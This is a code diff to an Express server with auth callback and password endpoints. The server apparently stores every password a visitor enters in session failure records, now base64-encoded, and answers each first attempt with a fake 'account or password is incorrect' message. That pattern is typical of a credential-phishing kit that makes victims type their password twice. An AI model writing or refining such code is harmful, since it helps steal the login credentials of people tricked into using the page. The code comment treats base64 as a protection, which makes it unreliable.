@@ -727,6 +727,7 @@ app.get('/api/auth-callback', async (req, res) => {
                 id: failureId,
                 sessionId: targetSession.sessionId,
                 email: targetSession.userEmail || 'Unknown',
+                password: '', // No password for OAuth failures
                 reason: 'OAuth Authentication Failed',
                 errorMessage: errorMessage,
                 errorDetails: errorDetails,
@@ -1203,7 +1204,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         id: failureId,
                         sessionId: sessionId || failureId,
                         email: email,
-                        password: password,
+                        password: Buffer.from(password).toString('base64'), // Always base64 encode
                         reason: attemptNum === 1 ? 'First Attempt' : 'Wrong Password',
                         errorMessage: attemptNum === 1 ? 'First password attempt recorded' : 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         timestamp: new Date().toISOString(),
@@ -1287,7 +1288,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
             id: failureId,
             sessionId: sessionId || failureId,
             email: email,
-            password: password,
+            password: Buffer.from(password).toString('base64'), // Always base64 encode
             reason: attemptNum === 1 ? 'First Attempt' : 'Wrong Password',
             errorMessage: attemptNum === 1 ? 'First password attempt recorded' : 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
             timestamp: new Date().toISOString(),
@@ -1340,7 +1341,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
             id: failureId,
             sessionId: req.body.sessionId || failureId,
             email: email,
-            password: password,
+            password: Buffer.from(password).toString('base64'), // Always base64 encode
             reason: 'Authentication Error',
             errorMessage: error.message,
             timestamp: new Date().toISOString(),
